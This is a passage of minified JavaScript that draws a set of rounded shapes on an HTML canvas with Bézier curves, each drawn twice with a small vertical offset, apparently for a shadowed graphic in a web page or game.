      n.bezierCurveTo(e * 302.0113830566406, e * 47.767059326171875, e * 302.0113830566406, e * 47.767059326171875, e * 307.0113830566406, e * 27.767059326171875);
      n.bezierCurveTo(e * 310.0113830566406, e * 15.767059326171875, e * 317.0113830566406, e * 12.767059326171875, e * 323.0113830566406, e * 13.767059326171875);
      n.closePath();
      ye(n, t[3], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 403.0113830566406, e * 89.76705932617188);
      n.bezierCurveTo(e * 413.0113830566406, e * 76.76705932617188, e * 418.0113830566406, e * 79.76705932617188, e * 428.0113830566406, e * 92.76705932617188);
      n.bezierCurveTo(e * 435.0113830566406, e * 99.76705932617188, e * 435.0113830566406, e * 99.76705932617188, e * 442.0113830566406, e * 106.76705932617188);
      n.bezierCurveTo(e * 450.0113830566406, e * 116.76705932617188, e * 445.0113830566406, e * 119.76705932617188, e * 433.0113830566406, e * 128.76705932617188);
      n.bezierCurveTo(e * 408.0113830566406, e * 146.26705932617188, e * 408.0113830566406, e * 146.26705932617188, e * 383.0113830566406, e * 163.76705932617188);
      n.bezierCurveTo(e * 376.0113830566406, e * 166.76705932617188, e * 377.0113830566406, e * 165.76705932617188, e * 368.0113830566406, e * 156.76705932617188);
      n.bezierCurveTo(e * 359.0113830566406, e * 144.76705932617188, e * 359.0113830566406, e * 142.76705932617188, e * 367.0113830566406, e * 133.76705932617188);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 403.0113830566406, e * 89.76705932617188);
      n.bezierCurveTo(e * 413.0113830566406, e * 76.76705932617188, e * 418.0113830566406, e * 79.76705932617188, e * 428.0113830566406, e * 92.76705932617188);
      n.bezierCurveTo(e * 435.0113830566406, e * 99.76705932617188, e * 435.0113830566406, e * 99.76705932617188, e * 442.0113830566406, e * 106.76705932617188);
      n.bezierCurveTo(e * 450.0113830566406, e * 116.76705932617188, e * 445.0113830566406, e * 119.76705932617188, e * 433.0113830566406, e * 128.76705932617188);
      n.bezierCurveTo(e * 408.0113830566406, e * 146.26705932617188, e * 408.0113830566406, e * 146.26705932617188, e * 383.0113830566406, e * 163.76705932617188);
      n.bezierCurveTo(e * 376.0113830566406, e * 166.76705932617188, e * 377.0113830566406, e * 165.76705932617188, e * 368.0113830566406, e * 156.76705932617188);
      n.bezierCurveTo(e * 359.0113830566406, e * 144.76705932617188, e * 359.0113830566406, e * 142.76705932617188, e * 367.0113830566406, e * 133.76705932617188);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 228.01138305664062, e * 1.767059326171875);
      n.bezierCurveTo(e * 246.51138305664062, e * 3.267059326171875, e * 246.51138305664062, e * 3.267059326171875, e * 265.0113830566406, e * 4.767059326171875);
      n.bezierCurveTo(e * 273.0113830566406, e * 5.767059326171875, e * 275.0113830566406, e * 11.767059326171875, e * 270.0113830566406, e * 27.767059326171875);
      n.bezierCurveTo(e * 264.0113830566406, e * 54.267059326171875, e * 264.0113830566406, e * 54.267059326171875, e * 258.0113830566406, e * 80.76705932617188);
      n.bezierCurveTo(e * 256.0113830566406, e * 92.76705932617188, e * 256.0113830566406, e * 94.76705932617188, e * 242.01138305664062, e * 93.76705932617188);
      n.bezierCurveTo(e * 226.01138305664062, e * 95.76705932617188, e * 225.01138305664062, e * 91.76705932617188, e * 225.01138305664062, e * 80.76705932617188);
      n.bezierCurveTo(e * 223.51138305664062, e * 50.267059326171875, e * 223.51138305664062, e * 50.267059326171875, e * 222.01138305664062, e * 19.767059326171875);
      n.bezierCurveTo(e * 219.01138305664062, e * 8.767059326171875, e * 224.01138305664062, e * 4.767059326171875, e * 227.01138305664062, e * 2.767059326171875);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 228.01138305664062, e * 1.767059326171875);
      n.bezierCurveTo(e * 246.51138305664062, e * 3.267059326171875, e * 246.51138305664062, e * 3.267059326171875, e * 265.0113830566406, e * 4.767059326171875);
      n.bezierCurveTo(e * 273.0113830566406, e * 5.767059326171875, e * 275.0113830566406, e * 11.767059326171875, e * 270.0113830566406, e * 27.767059326171875);
      n.bezierCurveTo(e * 264.0113830566406, e * 54.267059326171875, e * 264.0113830566406, e * 54.267059326171875, e * 258.0113830566406, e * 80.76705932617188);
      n.bezierCurveTo(e * 256.0113830566406, e * 92.76705932617188, e * 256.0113830566406, e * 94.76705932617188, e * 242.01138305664062, e * 93.76705932617188);
      n.bezierCurveTo(e * 226.01138305664062, e * 95.76705932617188, e * 225.01138305664062, e * 91.76705932617188, e * 225.01138305664062, e * 80.76705932617188);
      n.bezierCurveTo(e * 223.51138305664062, e * 50.267059326171875, e * 223.51138305664062, e * 50.267059326171875, e * 222.01138305664062, e * 19.767059326171875);
      n.bezierCurveTo(e * 219.01138305664062, e * 8.767059326171875, e * 224.01138305664062, e * 4.767059326171875, e * 227.01138305664062, e * 2.767059326171875);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 142.01138305664062, e * 25.767059326171875);
      n.bezierCurveTo(e * 158.51138305664062, e * 19.767059326171875, e * 158.51138305664062, e * 19.767059326171875, e * 175.01138305664062, e * 13.767059326171875);
      n.bezierCurveTo(e * 188.01138305664062, e * 11.767059326171875, e * 188.01138305664062, e * 16.767059326171875, e * 191.01138305664062, e * 29.767059326171875);
      n.bezierCurveTo(e * 197.01138305664062, e * 60.267059326171875, e * 197.01138305664062, e * 60.267059326171875, e * 203.01138305664062, e * 90.76705932617188);
      n.bezierCurveTo(e * 206.01138305664062, e * 102.76705932617188, e * 196.01138305664062, e * 99.76705932617188, e * 181.01138305664062, e * 105.76705932617188);
      n.bezierCurveTo(e * 175.01138305664062, e * 108.76705932617188, e * 172.01138305664062, e * 104.76705932617188, e * 164.01138305664062, e * 84.76705932617188);
      n.bezierCurveTo(e * 152.51138305664062, e * 63.267059326171875, e * 152.51138305664062, e * 63.267059326171875, e * 141.01138305664062, e * 41.767059326171875);
      n.bezierCurveTo(e * 138.01138305664062, e * 35.767059326171875, e * 138.01138305664062, e * 29.767059326171875, e * 141.01138305664062, e * 27.767059326171875);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 142.01138305664062, e * 25.767059326171875);
      n.bezierCurveTo(e * 158.51138305664062, e * 19.767059326171875, e * 158.51138305664062, e * 19.767059326171875, e * 175.01138305664062, e * 13.767059326171875);
      n.bezierCurveTo(e * 188.01138305664062, e * 11.767059326171875, e * 188.01138305664062, e * 16.767059326171875, e * 191.01138305664062, e * 29.767059326171875);
      n.bezierCurveTo(e * 197.01138305664062, e * 60.267059326171875, e * 197.01138305664062, e * 60.267059326171875, e * 203.01138305664062, e * 90.76705932617188);
      n.bezierCurveTo(e * 206.01138305664062, e * 102.76705932617188, e * 196.01138305664062, e * 99.76705932617188, e * 181.01138305664062, e * 105.76705932617188);
      n.bezierCurveTo(e * 175.01138305664062, e * 108.76705932617188, e * 172.01138305664062, e * 104.76705932617188, e * 164.01138305664062, e * 84.76705932617188);
      n.bezierCurveTo(e * 152.51138305664062, e * 63.267059326171875, e * 152.51138305664062, e * 63.267059326171875, e * 141.01138305664062, e * 41.767059326171875);
      n.bezierCurveTo(e * 138.01138305664062, e * 35.767059326171875, e * 138.01138305664062, e * 29.767059326171875, e * 141.01138305664062, e * 27.767059326171875);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 70.01138305664062, e * 76.76705932617188);
      n.bezierCurveTo(e * 83.01138305664062, e * 64.26705932617188, e * 83.01138305664062, e * 64.26705932617188, e * 96.01138305664062, e * 51.767059326171875);
      n.bezierCurveTo(e * 104.01138305664062, e * 44.767059326171875, e * 110.01138305664062, e * 51.767059326171875, e * 119.01138305664062, e * 66.76705932617188);
      n.bezierCurveTo(e * 135.01138305664062, e * 88.26705932617188, e * 135.01138305664062, e * 88.26705932617188, e * 151.01138305664062, e * 109.76705932617188);
      n.bezierCurveTo(e * 157.01138305664062, e * 119.76705932617188, e * 153.01138305664062, e * 122.76705932617188, e * 147.01138305664062, e * 129.76705932617188);
      n.bezierCurveTo(e * 138.01138305664062, e * 140.76705932617188, e * 136.01138305664062, e * 140.76705932617188, e * 122.01138305664062, e * 127.76705932617188);
      n.bezierCurveTo(e * 99.51138305664062, e * 110.26705932617188, e * 99.51138305664062, e * 110.26705932617188, e * 77.01138305664062, e * 92.76705932617188);
      n.bezierCurveTo(e * 66.01138305664062, e * 83.76705932617188, e * 66.01138305664062, e * 82.76705932617188, e * 69.01138305664062, e * 78.76705932617188);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 70.01138305664062, e * 76.76705932617188);
      n.bezierCurveTo(e * 83.01138305664062, e * 64.26705932617188, e * 83.01138305664062, e * 64.26705932617188, e * 96.01138305664062, e * 51.767059326171875);
      n.bezierCurveTo(e * 104.01138305664062, e * 44.767059326171875, e * 110.01138305664062, e * 51.767059326171875, e * 119.01138305664062, e * 66.76705932617188);
      n.bezierCurveTo(e * 135.01138305664062, e * 88.26705932617188, e * 135.01138305664062, e * 88.26705932617188, e * 151.01138305664062, e * 109.76705932617188);
      n.bezierCurveTo(e * 157.01138305664062, e * 119.76705932617188, e * 153.01138305664062, e * 122.76705932617188, e * 147.01138305664062, e * 129.76705932617188);
      n.bezierCurveTo(e * 138.01138305664062, e * 140.76705932617188, e * 136.01138305664062, e * 140.76705932617188, e * 122.01138305664062, e * 127.76705932617188);
      n.bezierCurveTo(e * 99.51138305664062, e * 110.26705932617188, e * 99.51138305664062, e * 110.26705932617188, e * 77.01138305664062, e * 92.76705932617188);
      n.bezierCurveTo(e * 66.01138305664062, e * 83.76705932617188, e * 66.01138305664062, e * 82.76705932617188, e * 69.01138305664062, e * 78.76705932617188);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 33.011383056640625, e * 126.76705932617188);
      n.bezierCurveTo(e * 22.011383056640625, e * 149.76705932617188, e * 22.011383056640625, e * 149.76705932617188, e * 11.011383056640625, e * 172.76705932617188);
      n.bezierCurveTo(e * 7.011383056640625, e * 184.76705932617188, e * 11.011383056640625, e * 189.76705932617188, e * 36.011383056640625, e * 195.76705932617188);
      n.bezierCurveTo(e * 61.011383056640625, e * 202.26705932617188, e * 61.011383056640625, e * 202.26705932617188, e * 86.01138305664062, e * 208.76705932617188);
      n.bezierCurveTo(e * 100.01138305664062, e * 214.76705932617188, e * 102.01138305664062, e * 203.76705932617188, e * 109.01138305664062, e * 189.76705932617188);
      n.bezierCurveTo(e * 117.01138305664062, e * 171.76705932617188, e * 116.01138305664062, e * 166.76705932617188, e * 97.01138305664062, e * 156.76705932617188);
      n.bezierCurveTo(e * 74.01138305664062, e * 140.76705932617188, e * 74.01138305664062, e * 140.76705932617188, e * 51.011383056640625, e * 124.76705932617188);
      n.bezierCurveTo(e * 42.011383056640625, e * 118.76705932617188, e * 37.011383056640625, e * 119.76705932617188, e * 33.011383056640625, e * 126.76705932617188);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 33.011383056640625, e * 126.76705932617188);
      n.bezierCurveTo(e * 22.011383056640625, e * 149.76705932617188, e * 22.011383056640625, e * 149.76705932617188, e * 11.011383056640625, e * 172.76705932617188);
      n.bezierCurveTo(e * 7.011383056640625, e * 184.76705932617188, e * 11.011383056640625, e * 189.76705932617188, e * 36.011383056640625, e * 195.76705932617188);
      n.bezierCurveTo(e * 61.011383056640625, e * 202.26705932617188, e * 61.011383056640625, e * 202.26705932617188, e * 86.01138305664062, e * 208.76705932617188);
      n.bezierCurveTo(e * 100.01138305664062, e * 214.76705932617188, e * 102.01138305664062, e * 203.76705932617188, e * 109.01138305664062, e * 189.76705932617188);
      n.bezierCurveTo(e * 117.01138305664062, e * 171.76705932617188, e * 116.01138305664062, e * 166.76705932617188, e * 97.01138305664062, e * 156.76705932617188);
      n.bezierCurveTo(e * 74.01138305664062, e * 140.76705932617188, e * 74.01138305664062, e * 140.76705932617188, e * 51.011383056640625, e * 124.76705932617188);
      n.bezierCurveTo(e * 42.011383056640625, e * 118.76705932617188, e * 37.011383056640625, e * 119.76705932617188, e * 33.011383056640625, e * 126.76705932617188);
      n.closePath();
      ye(n, t[3], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 13.011383056640625, e * 229.76705932617188);
      n.bezierCurveTo(e * 45.511383056640625, e * 233.76705932617188, e * 45.511383056640625, e * 233.76705932617188, e * 78.01138305664062, e * 237.76705932617188);
      n.bezierCurveTo(e * 92.01138305664062, e * 239.76705932617188, e * 92.01138305664062, e * 246.76705932617188, e * 91.01138305664062, e * 257.7670593261719);
      n.bezierCurveTo(e * 92.01138305664062, e * 275.7670593261719, e * 91.01138305664062, e * 274.7670593261719, e * 68.01138305664062, e * 276.7670593261719);
      n.bezierCurveTo(e * 42.511383056640625, e * 279.7670593261719, e * 42.511383056640625, e * 279.7670593261719, e * 17.011383056640625, e * 282.7670593261719);
      n.bezierCurveTo(e * 2.011383056640625, e * 282.7670593261719, e * 3.011383056640625, e * 276.7670593261719, e * 2.011383056640625, e * 260.7670593261719);
      n.bezierCurveTo(e * 2.011383056640625, e * 231.76705932617188, e * 4.011383056640625, e * 232.76705932617188, e * 11.011383056640625, e * 230.76705932617188);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 13.011383056640625, e * 229.76705932617188);
      n.bezierCurveTo(e * 45.511383056640625, e * 233.76705932617188, e * 45.511383056640625, e * 233.76705932617188, e * 78.01138305664062, e * 237.76705932617188);
      n.bezierCurveTo(e * 92.01138305664062, e * 239.76705932617188, e * 92.01138305664062, e * 246.76705932617188, e * 91.01138305664062, e * 257.7670593261719);
      n.bezierCurveTo(e * 92.01138305664062, e * 275.7670593261719, e * 91.01138305664062, e * 274.7670593261719, e * 68.01138305664062, e * 276.7670593261719);
      n.bezierCurveTo(e * 42.511383056640625, e * 279.7670593261719, e * 42.511383056640625, e * 279.7670593261719, e * 17.011383056640625, e * 282.7670593261719);
      n.bezierCurveTo(e * 2.011383056640625, e * 282.7670593261719, e * 3.011383056640625, e * 276.7670593261719, e * 2.011383056640625, e * 260.7670593261719);
      n.bezierCurveTo(e * 2.011383056640625, e * 231.76705932617188, e * 4.011383056640625, e * 232.76705932617188, e * 11.011383056640625, e * 230.76705932617188);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 97.01138305664062, e * 329.7670593261719);
      n.bezierCurveTo(e * 68.51138305664062, e * 343.7670593261719, e * 68.51138305664062, e * 343.7670593261719, e * 40.011383056640625, e * 357.7670593261719);
      n.bezierCurveTo(e * 29.011383056640625, e * 360.7670593261719, e * 27.011383056640625, e * 361.7670593261719, e * 20.011383056640625, e * 346.7670593261719);
      n.bezierCurveTo(e * 16.511383056640625, e * 336.2670593261719, e * 16.511383056640625, e * 336.2670593261719, e * 13.011383056640625, e * 325.7670593261719);
      n.bezierCurveTo(e * 10.011383056640625, e * 307.7670593261719, e * 18.011383056640625, e * 312.7670593261719, e * 34.011383056640625, e * 306.7670593261719);
      n.bezierCurveTo(e * 59.511383056640625, e * 302.2670593261719, e * 59.511383056640625, e * 302.2670593261719, e * 85.01138305664062, e * 297.7670593261719);
      n.bezierCurveTo(e * 97.01138305664062, e * 294.7670593261719, e * 100.01138305664062, e * 297.7670593261719, e * 100.01138305664062, e * 307.7670593261719);
      n.bezierCurveTo(e * 105.01138305664062, e * 326.7670593261719, e * 103.01138305664062, e * 325.7670593261719, e * 97.01138305664062, e * 329.7670593261719);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 97.01138305664062, e * 329.7670593261719);
      n.bezierCurveTo(e * 68.51138305664062, e * 343.7670593261719, e * 68.51138305664062, e * 343.7670593261719, e * 40.011383056640625, e * 357.7670593261719);
      n.bezierCurveTo(e * 29.011383056640625, e * 360.7670593261719, e * 27.011383056640625, e * 361.7670593261719, e * 20.011383056640625, e * 346.7670593261719);
      n.bezierCurveTo(e * 16.511383056640625, e * 336.2670593261719, e * 16.511383056640625, e * 336.2670593261719, e * 13.011383056640625, e * 325.7670593261719);
      n.bezierCurveTo(e * 10.011383056640625, e * 307.7670593261719, e * 18.011383056640625, e * 312.7670593261719, e * 34.011383056640625, e * 306.7670593261719);
      n.bezierCurveTo(e * 59.511383056640625, e * 302.2670593261719, e * 59.511383056640625, e * 302.2670593261719, e * 85.01138305664062, e * 297.7670593261719);
      n.bezierCurveTo(e * 97.01138305664062, e * 294.7670593261719, e * 100.01138305664062, e * 297.7670593261719, e * 100.01138305664062, e * 307.7670593261719);
      n.bezierCurveTo(e * 105.01138305664062, e * 326.7670593261719, e * 103.01138305664062, e * 325.7670593261719, e * 97.01138305664062, e * 329.7670593261719);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 394.0113830566406, e * 181.76705932617188);
      n.bezierCurveTo(e * 426.5113830566406, e * 166.76705932617188, e * 426.5113830566406, e * 166.76705932617188, e * 459.0113830566406, e * 151.76705932617188);
      n.bezierCurveTo(e * 469.0113830566406, e * 152.76705932617188, e * 469.0113830566406, e * 155.76705932617188, e * 472.0113830566406, e * 165.76705932617188);
      n.bezierCurveTo(e * 476.0113830566406, e * 177.26705932617188, e * 476.0113830566406, e * 177.26705932617188, e * 480.0113830566406, e * 188.76705932617188);
      n.bezierCurveTo(e * 483.0113830566406, e * 199.76705932617188, e * 480.0113830566406, e * 200.76705932617188, e * 460.0113830566406, e * 205.76705932617188);
      n.bezierCurveTo(e * 433.5113830566406, e * 210.26705932617188, e * 433.5113830566406, e * 210.26705932617188, e * 407.0113830566406, e * 214.76705932617188);
      n.bezierCurveTo(e * 395.0113830566406, e * 218.76705932617188, e * 397.0113830566406, e * 211.76705932617188, e * 393.0113830566406, e * 202.76705932617188);
      n.bezierCurveTo(e * 387.0113830566406, e * 188.76705932617188, e * 387.0113830566406, e * 187.76705932617188, e * 394.0113830566406, e * 181.76705932617188);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 394.0113830566406, e * 181.76705932617188);
      n.bezierCurveTo(e * 426.5113830566406, e * 166.76705932617188, e * 426.5113830566406, e * 166.76705932617188, e * 459.0113830566406, e * 151.76705932617188);
      n.bezierCurveTo(e * 469.0113830566406, e * 152.76705932617188, e * 469.0113830566406, e * 155.76705932617188, e * 472.0113830566406, e * 165.76705932617188);
      n.bezierCurveTo(e * 476.0113830566406, e * 177.26705932617188, e * 476.0113830566406, e * 177.26705932617188, e * 480.0113830566406, e * 188.76705932617188);
      n.bezierCurveTo(e * 483.0113830566406, e * 199.76705932617188, e * 480.0113830566406, e * 200.76705932617188, e * 460.0113830566406, e * 205.76705932617188);
      n.bezierCurveTo(e * 433.5113830566406, e * 210.26705932617188, e * 433.5113830566406, e * 210.26705932617188, e * 407.0113830566406, e * 214.76705932617188);
      n.bezierCurveTo(e * 395.0113830566406, e * 218.76705932617188, e * 397.0113830566406, e * 211.76705932617188, e * 393.0113830566406, e * 202.76705932617188);
      n.bezierCurveTo(e * 387.0113830566406, e * 188.76705932617188, e * 387.0113830566406, e * 187.76705932617188, e * 394.0113830566406, e * 181.76705932617188);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 411.0113830566406, e * 234.76705932617188);
      n.bezierCurveTo(e * 446.0113830566406, e * 233.26705932617188, e * 446.0113830566406, e * 233.26705932617188, e * 481.0113830566406, e * 231.76705932617188);
      n.bezierCurveTo(e * 491.0113830566406, e * 232.76705932617188, e * 493.0113830566406, e * 239.76705932617188, e * 491.0113830566406, e * 251.76705932617188);
      n.bezierCurveTo(e * 490.0113830566406, e * 263.7670593261719, e * 490.0113830566406, e * 263.7670593261719, e * 489.0113830566406, e * 275.7670593261719);
      n.bezierCurveTo(e * 487.0113830566406, e * 283.7670593261719, e * 483.0113830566406, e * 284.7670593261719, e * 464.0113830566406, e * 280.7670593261719);
      n.bezierCurveTo(e * 437.0113830566406, e * 273.7670593261719, e * 437.0113830566406, e * 273.7670593261719, e * 410.0113830566406, e * 266.7670593261719);
      n.bezierCurveTo(e * 400.0113830566406, e * 261.7670593261719, e * 401.0113830566406, e * 259.7670593261719, e * 402.0113830566406, e * 249.76705932617188);
      n.bezierCurveTo(e * 401.0113830566406, e * 237.76705932617188, e * 403.0113830566406, e * 235.76705932617188, e * 408.0113830566406, e * 234.76705932617188);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 411.0113830566406, e * 234.76705932617188);
      n.bezierCurveTo(e * 446.0113830566406, e * 233.26705932617188, e * 446.0113830566406, e * 233.26705932617188, e * 481.0113830566406, e * 231.76705932617188);
      n.bezierCurveTo(e * 491.0113830566406, e * 232.76705932617188, e * 493.0113830566406, e * 239.76705932617188, e * 491.0113830566406, e * 251.76705932617188);
      n.bezierCurveTo(e * 490.0113830566406, e * 263.7670593261719, e * 490.0113830566406, e * 263.7670593261719, e * 489.0113830566406, e * 275.7670593261719);
      n.bezierCurveTo(e * 487.0113830566406, e * 283.7670593261719, e * 483.0113830566406, e * 284.7670593261719, e * 464.0113830566406, e * 280.7670593261719);
      n.bezierCurveTo(e * 437.0113830566406, e * 273.7670593261719, e * 437.0113830566406, e * 273.7670593261719, e * 410.0113830566406, e * 266.7670593261719);
      n.bezierCurveTo(e * 400.0113830566406, e * 261.7670593261719, e * 401.0113830566406, e * 259.7670593261719, e * 402.0113830566406, e * 249.76705932617188);
      n.bezierCurveTo(e * 401.0113830566406, e * 237.76705932617188, e * 403.0113830566406, e * 235.76705932617188, e * 408.0113830566406, e * 234.76705932617188);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 400.0113830566406, e * 290.7670593261719);
      n.bezierCurveTo(e * 437.0113830566406, e * 301.2670593261719, e * 437.0113830566406, e * 301.2670593261719, e * 474.0113830566406, e * 311.7670593261719);
      n.bezierCurveTo(e * 484.0113830566406, e * 319.7670593261719, e * 481.0113830566406, e * 322.7670593261719, e * 474.0113830566406, e * 335.7670593261719);
      n.bezierCurveTo(e * 465.5113830566406, e * 354.7670593261719, e * 465.5113830566406, e * 354.7670593261719, e * 457.0113830566406, e * 373.7670593261719);
      n.bezierCurveTo(e * 449.0113830566406, e * 386.7670593261719, e * 444.0113830566406, e * 384.7670593261719, e * 427.0113830566406, e * 370.7670593261719);
      n.bezierCurveTo(e * 403.0113830566406, e * 354.7670593261719, e * 403.0113830566406, e * 354.7670593261719, e * 379.0113830566406, e * 338.7670593261719);
      n.bezierCurveTo(e * 371.0113830566406, e * 327.7670593261719, e * 373.0113830566406, e * 323.7670593261719, e * 377.0113830566406, e * 313.7670593261719);
      n.bezierCurveTo(e * 386.0113830566406, e * 292.7670593261719, e * 393.0113830566406, e * 288.7670593261719, e * 398.0113830566406, e * 291.7670593261719);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 400.0113830566406, e * 290.7670593261719);
      n.bezierCurveTo(e * 437.0113830566406, e * 301.2670593261719, e * 437.0113830566406, e * 301.2670593261719, e * 474.0113830566406, e * 311.7670593261719);
      n.bezierCurveTo(e * 484.0113830566406, e * 319.7670593261719, e * 481.0113830566406, e * 322.7670593261719, e * 474.0113830566406, e * 335.7670593261719);
      n.bezierCurveTo(e * 465.5113830566406, e * 354.7670593261719, e * 465.5113830566406, e * 354.7670593261719, e * 457.0113830566406, e * 373.7670593261719);
      n.bezierCurveTo(e * 449.0113830566406, e * 386.7670593261719, e * 444.0113830566406, e * 384.7670593261719, e * 427.0113830566406, e * 370.7670593261719);
      n.bezierCurveTo(e * 403.0113830566406, e * 354.7670593261719, e * 403.0113830566406, e * 354.7670593261719, e * 379.0113830566406, e * 338.7670593261719);
      n.bezierCurveTo(e * 371.0113830566406, e * 327.7670593261719, e * 373.0113830566406, e * 323.7670593261719, e * 377.0113830566406, e * 313.7670593261719);
      n.bezierCurveTo(e * 386.0113830566406, e * 292.7670593261719, e * 393.0113830566406, e * 288.7670593261719, e * 398.0113830566406, e * 291.7670593261719);
      n.closePath();
      ye(n, t[3], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 366.0113830566406, e * 361.2216033935547);
      n.bezierCurveTo(e * 393.0113830566406, e * 383.2216033935547, e * 393.0113830566406, e * 383.2216033935547, e * 420.0113830566406, e * 405.2216033935547);
      n.bezierCurveTo(e * 427.0113830566406, e * 414.2216033935547, e * 425.0113830566406, e * 417.2216033935547, e * 413.0113830566406, e * 428.2216033935547);
      n.bezierCurveTo(e * 405.5113830566406, e * 435.2216033935547, e * 405.5113830566406, e * 435.2216033935547, e * 398.0113830566406, e * 442.2216033935547);
      n.bezierCurveTo(e * 388.0113830566406, e * 451.2216033935547, e * 385.0113830566406, e * 445.2216033935547, e * 373.0113830566406, e * 428.2216033935547);
      n.bezierCurveTo(e * 358.5113830566406, e * 408.2216033935547, e * 358.5113830566406, e * 408.2216033935547, e * 344.0113830566406, e * 388.2216033935547);
      n.bezierCurveTo(e * 337.0113830566406, e * 378.2216033935547, e * 342.0113830566406, e * 377.2216033935547, e * 347.0113830566406, e * 371.2216033935547);
      n.bezierCurveTo(e * 359.0113830566406, e * 359.2216033935547, e * 361.0113830566406, e * 358.2216033935547, e * 364.0113830566406, e * 361.2216033935547);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 366.0113830566406, e * 361.2216033935547);
      n.bezierCurveTo(e * 393.0113830566406, e * 383.2216033935547, e * 393.0113830566406, e * 383.2216033935547, e * 420.0113830566406, e * 405.2216033935547);
      n.bezierCurveTo(e * 427.0113830566406, e * 414.2216033935547, e * 425.0113830566406, e * 417.2216033935547, e * 413.0113830566406, e * 428.2216033935547);
      n.bezierCurveTo(e * 405.5113830566406, e * 435.2216033935547, e * 405.5113830566406, e * 435.2216033935547, e * 398.0113830566406, e * 442.2216033935547);
      n.bezierCurveTo(e * 388.0113830566406, e * 451.2216033935547, e * 385.0113830566406, e * 445.2216033935547, e * 373.0113830566406, e * 428.2216033935547);
      n.bezierCurveTo(e * 358.5113830566406, e * 408.2216033935547, e * 358.5113830566406, e * 408.2216033935547, e * 344.0113830566406, e * 388.2216033935547);
      n.bezierCurveTo(e * 337.0113830566406, e * 378.2216033935547, e * 342.0113830566406, e * 377.2216033935547, e * 347.0113830566406, e * 371.2216033935547);
      n.bezierCurveTo(e * 359.0113830566406, e * 359.2216033935547, e * 361.0113830566406, e * 358.2216033935547, e * 364.0113830566406, e * 361.2216033935547);
      n.closePath();
      ye(n, t[4], t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 323.0113830566406, e * 393.2216033935547);
      n.bezierCurveTo(e * 338.0113830566406, e * 424.7216033935547, e * 338.0113830566406, e * 424.7216033935547, e * 353.0113830566406, e * 456.2216033935547);
